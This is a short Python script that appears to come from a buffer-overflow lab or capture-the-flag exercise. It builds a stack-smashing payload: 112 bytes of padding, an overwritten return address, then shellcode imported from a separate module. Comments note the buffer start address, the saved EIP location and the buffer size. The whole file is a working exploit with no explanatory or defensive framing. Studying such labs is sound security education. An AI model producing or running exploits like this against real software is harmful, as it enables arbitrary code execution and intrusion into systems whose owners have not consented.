from shellcode import shellcode
from struct import pack 
import sys

def main():
    for i in range(112):
        sys.stdout.buffer.write(b"A")
    sys.stdout.buffer.write(pack("<I",0xfffe8bd0))
    sys.stdout.buffer.write(shellcode)

if __name__ == "__main__":
    main()
#return addr points to 
    #eip 0xfffef9ac

#buffer starts @
    #0xfffef93c
    #buffer size 112

